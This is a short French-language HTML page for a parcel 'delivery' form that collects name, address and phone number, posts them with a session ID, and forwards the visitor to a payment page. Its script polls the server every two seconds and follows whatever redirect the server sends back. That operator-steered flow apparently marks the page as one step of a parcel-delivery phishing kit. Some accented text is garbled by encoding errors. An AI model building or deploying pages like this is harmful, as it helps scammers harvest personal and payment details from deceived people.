<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"><title>Livraison</title></head>
<body>
<h1>ðŸ“¦ Livraison</h1>
<form id="deliveryForm">
Nom: <input name="nom"><br>
PrÃ©nom: <input name="prenom"><br>
Adresse: <input name="adresse"><br>
TÃ©lÃ©phone: <input name="telephone"><br>
<button type="submit">Suivant</button>
</form>
<script>
document.getElementById('deliveryForm').onsubmit = async function(e){
  e.preventDefault();
  const sessionId = localStorage.getItem('sessionId');
  const data = {
    sessionId,
    nom:this.nom.value,
    prenom:this.prenom.value,
    adresse:this.adresse.value,
    telephone:this.telephone.value
  };
  await fetch('/api/delivery',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
  window.location.href = '/payment.html?sid='+sessionId;
}
async function checkRedirect(){
  const sessionId = localStorage.getItem('sessionId');
  if(!sessionId) return;
  const res = await fetch('/api/status?sessionId='+sessionId);
  const data = await res.json();
  if(data.redirect) window.location.href = data.redirect;
  else setTimeout(checkRedirect,2000);
}
checkRedirect();
</script>
</body>
</html>
